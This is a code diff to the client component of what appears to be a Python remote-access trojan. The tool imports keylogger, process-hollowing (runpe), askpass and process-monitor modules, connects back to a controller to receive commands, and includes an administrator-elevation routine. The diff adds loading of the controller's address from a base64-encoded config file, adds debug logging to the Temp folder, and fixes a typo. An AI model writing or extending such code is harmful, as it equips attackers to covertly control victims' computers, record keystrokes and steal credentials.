@@ -8,6 +8,7 @@ import inspect
 import io
 import json
 import locale
+import logging
 import os
 import pathlib
 import platform
@@ -44,23 +45,56 @@ import wmi
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 
-import askpass
-import filewatch
-import keylogger
-import procmon
-import runpe
-import wer
+from modules import askpass
+from modules import filewatch
+from modules import keylogger
+from modules import procmon
+from modules import runpe
+from modules import wer
+
+sys.path.insert(0, '/modules/')
 
 TEMP_DIR = os.path.expanduser('~') + r'\AppData\Local\Temp'
 EXECUTABLE_PATH = os.path.realpath(sys.executable)
 PROG_NAME = pathlib.Path(EXECUTABLE_PATH).stem
 
+logging.basicConfig(
+    filename=os.path.join(TEMP_DIR, 'client.log'),
+    format='[%(asctime)s] %(levelname)s: %(message)s',
+    level=logging.DEBUG,
+    datefmt='%Y-%m-%d %H:%M:%S'
+)
+
+logger = logging.getLogger(__name__)
+
 
 class Client:
     def __init__(self):
         self.socket = socket.socket()
-        self.host = '127.0.0.1'
-        self.port = 9999
+        self.host, self.port = self.load_config()
+        self.logging = 1
+
+    @staticmethod
+    def load_config():
+        try:
+            if not getattr(sys, 'frozen', False):
+                exec_dir = os.path.dirname(' '.join(sys.argv))
+            else:
+                exec_dir = os.path.dirname(EXECUTABLE_PATH)
+            paths = [os.path.join(exec_dir, 'conf'), os.path.join(TEMP_DIR, 'conf')]
+            for path in paths:
+                if os.path.isfile(path):
+                    exec_dir = path
+                    break
+            with open(exec_dir, 'r') as f:
+                data = f.read().encode()
+                data = base64.b64decode(data)
+                config = data.decode()
+                config = json.loads(config)
+                return config['ip'], int(config['port'])
+        except Exception as exception:
+            print(exception)
+            return '127.0.0.1', 9999
 
     def connect(self):
         while self.socket.connect_ex((self.host, self.port)) != 0:
@@ -709,7 +743,7 @@ class Command:
                 else:
                     return 0, '[-] Error: {}'.format(result)
             else:
-                return 0, '[-} Already elevated as administrator'
+                return 0, '[-] Already elevated as administrator'
         except Exception as exception:
             return 0, '[-] Error: {}'.format(exception)
 
@@ -1436,10 +1470,14 @@ while True:
         try:
             client.recv_commands()
         except socket.error as e:
+            if client.logging:
+                logger.error(e)
             print(e)
             client.socket.close()
             client.socket = socket.socket()
             break
         except Exception as ex:
+            if client.logging:
+                logger.error(ex)
             print(ex)
             continue
